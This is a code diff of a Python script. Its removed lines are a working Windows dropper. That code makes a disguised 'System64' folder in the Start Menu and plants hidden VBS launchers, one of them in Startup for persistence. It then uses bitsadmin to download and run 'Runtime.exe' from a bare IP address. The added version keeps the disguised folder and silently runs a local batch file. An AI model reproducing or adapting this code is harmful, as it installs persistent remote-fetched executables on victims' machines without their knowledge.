@@ -1,26 +1,50 @@
+'''
+ # @ Author: Taylor Brierley
+ # @ Create Time: 2024-09-16 09:48:58
+ # @ Modified by: Taylor Brierley
+ # @ Modified time: 2024-09-16 09:49:52
+ # @ Description:
+ '''
+
+
 import os
 import subprocess
-login = os.getlogin()
 
-if os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
-\System64\\') == False:
-    os.mkdir(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
-    \System64")
-    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\
-    \WIN32.vbs", "a").write(f'Set WshShell = CreateObject("WScript.Shell") \nWshShell. Run chr(34) & "C:\
-    \Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.bat" &
-    Chr(34), 0\nSet WshShell = Nothing')
-    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
-    \WIN64.vbs", "a").write(f'''Set WshShell = CreateObject("WScript.Shell") \nWshShell. Run chr(34) & "C:\
-    \Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe" &
-    Chr(34), 0\nSet WshShell = Nothing''')
-    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\
-    \WIN32.bat", "a").write(f'''bitsadmin /transfer mydownloadjob /download/priority FOREGROUND
-    "http://51.178.25.148:8081/dl/runtime" "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\
-    \Start Menu\\Programs\\System64\\Runtime.exe" \nstart "" "C:\\Users\\{login}\\AppData\\Roaming\
-    \Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WIN64.vbs"''')
-    subprocess.run(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
-    \System64\\WIN32.vbs", shell=True, check=True)
-else:   
-    pass
-# print("hi installing...")
+def check_and_create_directory():
+    start_menu_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs')
+    system64_path = os.path.join(start_menu_path, 'System64')
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+
+
+    if not os.path.exists(system64_path):
+        try:
+            os.makedirs(system64_path)
+            print(f'Directory "System64" created at: {system64_path}')
+
+            run_file(os.path.join(script_dir, 'batch.bat'))
+ 
+        except Exception as e:
+            print(f'An error occurred while creating the directory: {e}')
+    else:
+        print(f'Directory "System64" already exists at: {system64_path}')
+
+
+        run_file(os.path.join(script_dir, 'batch.bat'))
+
+
+def run_file(filepath):
+
+    if  os.path.exists(filepath):
+        print(f'Batch file correctly located')
+
+        print(f'Running batch file')
+        subprocess.run([filepath], check=True)
+
+    else:
+        print(f'Batch file not located')
+        
+
+
+if __name__ == "__main__":
+    check_and_create_directory()
